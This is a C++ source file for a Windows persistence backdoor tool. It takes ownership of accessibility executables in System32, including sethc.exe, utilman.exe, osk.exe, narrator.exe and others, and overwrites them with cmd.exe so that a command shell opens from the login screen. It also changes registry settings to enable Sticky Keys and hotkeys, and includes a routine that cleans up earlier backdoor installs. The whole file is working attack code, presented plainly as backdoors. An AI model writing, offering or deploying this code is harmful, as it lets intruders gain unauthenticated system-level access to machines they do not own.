#include <iostream>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>

void error_handling(int status, const std::string& command) {
    if (status != 0) {
        std::cout << "Error Running Command: " << command << std::endl;
    }
}

void priv_esc() {
    //grants administrative permissions to sethc.exe (Sticky Keys)
    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe"), "takeown /f C:\\Windows\\System32\\sethc.exe");
    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");

    //grants administrative permissions to utilman.exe (Utility Manager)
    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe"), "takeown /f C:\\Windows\\System32\\utilman.exe");
    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");

    //grants administrative permissions to narrator.exe (Narrator)
    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe"), "takeown /f C:\\Windows\\System32\\narrator.exe");
    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");

    //grants administrative permissions to osk.exe (On Screen Keyboard)
    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe"), "takeown /f C:\\Windows\\System32\\osk.exe");
    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");

    //grants administrative permissions to sethc.exe (Magnifier)
    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe"), "takeown /f C:\\Windows\\System32\\magnify.exe");
    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");

    //grants administrative permissions to displayswitch.exe (Display)
    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");

    //grants administrative permissions to snippingtool.exe (Snipping Tool)
    error_handling(system("takeown /f C:\\Windows\\System32\\snippingtool.exe"), "takeown /f C:\\Windows\\System32\\snippingtool.exe");
    error_handling(system("icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F");
}

void cleanup() {
    //searches through system32 to find previously-run backdoors
    system("dir C:\\Windows\\System32\\old-*.* /b /s > C:\\Windows\\System32\\old_files.txt 2> nul");
    std::vector<std::string> replacedExecutables;
    std::ifstream file("C:\\Windows\\System32\\old_files.txt");
    std::string line;

    //reads each line from the file and add to the vector
    while (std::getline(file, line)) {
        replacedExecutables.push_back(line);
    }
    file.close();

    //restores original executables by renaming old-* files back to their original names
    //also deletes previous backdoor executables
    for (const std::string& executable : replacedExecutables) {
        std::string original = executable;
        original.replace(executable.find("old-"), 4, "");
        //deletes previous backdoors
        std::string delCommand = "del " + original;
        //std::cout << delCommand << std::endl; testing
        error_handling(system(delCommand.c_str()), delCommand.c_str());
        //restores original executables
        std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
        //std::cout << renameCommand << std::endl; testing
        error_handling(system(renameCommand.c_str()), renameCommand.c_str());
    }
}

void sticky_keys() {
    //makes sure that sticky keys is turned on
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f"), 
    "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
    
    //replaces sethc.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
}

void utility_manager() {
    //replaces utilman.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
}

void narrator() {
    //replaces narrator.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
}

void on_screen_keyboard() {
    //replaces osk.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
}

void magnifier() {
    //replaces magnify.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
}

void display_switch() {
    //replaces displayswitch.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
}

void snipping_tool() {
    //replaces snippingtool.exe with cmd.exe
    error_handling(system("rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe"), "rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe");
    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
}

int main(int argc, char *argv[]){
    //grants administrator permissions to all backdoor executables
    std::cout << "Gaining Permissions..." << std::endl;
    priv_esc();

    //enables all windows hotkeys on the error_handling(system
    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f"), 
    "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");

    //cleans up previous runs beforehand
    std::cout << "Cleaning Up..." << std::endl;
    cleanup();

    //executes selected backdoors
    std::cout << "Executing Backdoors..." << std::endl;
    if (argc == 0) {
        sticky_keys();
        utility_manager();
        narrator();
        on_screen_keyboard();
        magnifier();
        display_switch();
        snipping_tool();
    }
    else {
        for (int i = 1; i < argc; i++) {
            const std::string arg = argv[i];
            if (arg == "sk") {
                sticky_keys();
                std::cout << "Executed Sticky Keys Backdoor" << std::endl;
            } else if (arg == "um") {
                utility_manager();
                std::cout << "Executed Utility Manager Backdoor" << std::endl;
            } else if (arg == "n") {
                narrator();
                std::cout << "Executed Narrator Backdoor" << std::endl;
            } else if (arg == "osk") {
                on_screen_keyboard();
                std::cout << "Executed On Screen Keyboard Backdoor" << std::endl;
            } else if (arg == "m") {
                magnifier();
                std::cout << "Executed Magnifier Backdoor" << std::endl;
            } else if (arg == "ds") {
                display_switch();
                std::cout << "Executed Display Switch Backdoor" << std::endl;
            } else if (arg == "st") {
                snipping_tool();
                std::cout << "Executed Snipping Tool Backdoor" << std::endl;
            } else {
                std::cout << "Invalid Argument: " << arg << std::endl;
            }
        }
    }

    return 0;
}